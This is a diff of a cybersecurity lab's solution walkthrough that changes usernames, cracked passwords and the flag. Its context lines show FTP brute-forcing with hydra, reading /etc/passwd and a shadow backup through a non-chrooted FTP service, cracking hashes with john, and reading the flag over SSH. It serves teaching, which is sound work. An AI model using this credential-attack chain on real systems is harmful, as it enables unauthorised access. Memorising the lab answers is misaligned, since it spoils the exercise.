@@ -55,7 +55,7 @@ The necessary steps to solve the scenario are as follows:
    [...]
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 696 login tries (l:232/p:3), ~44 tries per task
    [DATA] attacking ftp://10.0.1.5:21/
-	   [21][ftp] host: 10.0.1.5  login: aarevalo   password: aarevalo
+	   [21][ftp] host: 10.0.1.5  login: halagia   password: halagia
    [...]
    1 of 1 target successfully completed, 1 valid password found
    ```
@@ -65,14 +65,14 @@ The necessary steps to solve the scenario are as follows:
    `/etc/passwd` file, since the service is not isolated correctly (no
    chroot), and a backup of the shadow file `shadow.bak`:
    ```console
-   trainee01@attacker$ ssh aarevalo@10.0.1.5
-   aarevalo@10.0.1.5's password: 
+   trainee01@attacker$ ssh halagia@10.0.1.5
+   halagia@10.0.1.5's password: 
    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
    [...]
    This account is currently not available.
    Connection to 10.0.1.5 closed.
   
-   trainee01@attacker$ ftp ftp://aarevalo:aarevalo@10.0.1.5
+   trainee01@attacker$ ftp ftp://halagia:halagia@10.0.1.5
    Connected to 10.0.1.5.
    220 (vsFTPd 3.0.5)
    331 Please specify the password.
@@ -111,8 +111,8 @@ The necessary steps to solve the scenario are as follows:
    trainee01@attacker$ unshadow passwd shadow.bak > tocrack
    trainee01@attacker$ cat tocrack
    ...
-   daguirre:$6$rounds=656000$bimfuxpo$RptBix...:1004:1004:Diego Aguirre:/home/daguirre:/bin/bash
-   aarevalo:$6$rounds=656000$bvvdpknf$AA1j2y4...:1005:1005:Andres Arevalo:/home/aarevalo:/usr/sbin/nologin
+   mmentesa:$6$rounds=656000$bimfuxpo$RptBix...:1004:1004:Maria J. Mentesana:/home/mmentesa:/bin/bash
+   halagia:$6$rounds=656000$bvvdpknf$AA1j2y4...:1005:1005:Humberto R. Alagia:/home/halagia:/usr/sbin/nologin
    ```
 
    Using the unshadowed file, crack the remaining password with john:
@@ -120,21 +120,21 @@ The necessary steps to solve the scenario are as follows:
    trainee01@attacker$ john --single tocrack
    Created directory: /home/trainee01/.john
    Loaded 2 password hashes with 2 different salts [...]
-   aarevalo         (aarevalo)
-   aguirrediego!    (daguirre)
+   halagia           (halagia)
+   mariamentesana!   (mmentesa)
    ```
 
-   John immediately finds the FTP user password *aarevalo* (that is the
-   same as the username), and a few seconds later, *daguirre*'s that
+   John immediately finds the FTP user password *halagia* (that is the
+   same as the username), and a few seconds later, *mmentesa*'s that
    is based on their gecos information. This user has SSH access to
    the victim. The flag can be found in their homedir:
    ```console
-   trainee01@attacker$ ssh daguirre@10.0.1.5
-   daguirre@10.0.1.5's password: 
+   trainee01@attacker$ ssh mmentesa@10.0.1.5
+   mmentesa@10.0.1.5's password: 
    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
    [...]
-   daguirre@victim-1$ cat flag.txt
-   01i=^k{+`l3&8as$4zc2)d?[@-~ge7m1
+   mmentesa@victim-1$ cat flag.txt
+   ~^4%l93sh1nb-5|ge6*&w+8[()<@mda0
    ```
 
 ## Assessment
